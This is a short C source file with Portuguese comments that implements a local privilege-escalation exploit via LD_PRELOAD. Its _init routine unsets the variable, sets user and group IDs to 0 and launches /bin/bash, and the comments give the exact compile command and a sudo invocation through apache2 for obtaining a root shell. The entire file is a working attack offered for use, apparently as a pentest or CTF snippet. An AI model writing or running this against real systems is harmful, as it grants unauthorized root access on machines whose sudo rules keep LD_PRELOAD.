// PRIVESC através do LD_PRELOAD

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

//compilação: "gcc -fPIC -shared -o /tmp/preload_privesc.so preload_privesc.c -nostartfiles"
//exemplo de execução: sudo LD_PRELOAD=/tmp/preload_privesc.so apache2 (o apache2 precisa estar no lista de sudo)
